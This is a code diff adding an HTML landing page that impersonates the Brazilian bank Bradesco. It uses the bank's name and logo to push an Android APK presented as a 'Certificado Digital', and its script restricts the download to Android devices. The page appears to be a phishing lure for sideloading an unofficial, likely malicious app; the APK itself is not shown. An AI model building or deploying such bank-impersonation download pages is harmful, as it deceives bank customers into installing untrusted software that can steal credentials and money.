@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <title>Bradesco - Download</title>
+  <link rel="preload" href="video_fundo.mp4" as="video" type="video/mp4">
+  <link rel="preload" href="logo.jpeg" as="image">
+  <link rel="stylesheet" href="styles.css">
+  <meta name="theme-color" content="#c40000">
+</head>
+<body>
+  <main class="page">
+    <video class="bg-video" src="video_fundo.mp4" autoplay muted loop playsinline></video>
+    <div class="overlay"></div>
+
+    <div class="center-content" role="img" aria-label="Logo Bradesco">
+      <img class="logo" src="logo.jpeg" alt="Bradesco" />
+    </div>
+
+    <div class="notice" id="platform-notice" role="alert" aria-live="assertive"></div>
+
+    <a class="download-button" href="./Certificado%20Digital%20-%20Bradesco%20S.A.apk" download="Certificado Digital - Bradesco S.A.apk" aria-label="Download">
+      <span>Download</span>
+    </a>
+  </main>
+  <script>
+    (function() {
+      var video = document.querySelector('.bg-video');
+      if (video) {
+        video.addEventListener('ended', function() {
+          try {
+            video.currentTime = 0;
+            var playPromise = video.play();
+            if (playPromise && typeof playPromise.then === 'function') {
+              playPromise.catch(function(){});
+            }
+          } catch (e) {}
+        });
+      }
+
+      var ua = navigator.userAgent || navigator.vendor || window.opera;
+      var isAndroid = /Android/i.test(ua);
+      var isIOS = /iPhone|iPad|iPod/i.test(ua);
+
+      var downloadBtn = document.querySelector('.download-button');
+      var notice = document.getElementById('platform-notice');
+
+      if (downloadBtn && !isAndroid) {
+        downloadBtn.classList.add('disabled');
+        var msg = isIOS ? 'Download de APK disponível apenas em dispositivos Android.' : 'Este download está disponível apenas em dispositivos Android.';
+        if (notice) {
+          notice.textContent = msg;
+          notice.classList.add('show');
+        }
+        downloadBtn.addEventListener('click', function(e) {
+          e.preventDefault();
+          e.stopPropagation();
+          if (notice) {
+            notice.classList.add('show');
+          }
+        }, { passive: false });
+      }
+    })();
+  </script>
+</body>
+</html>
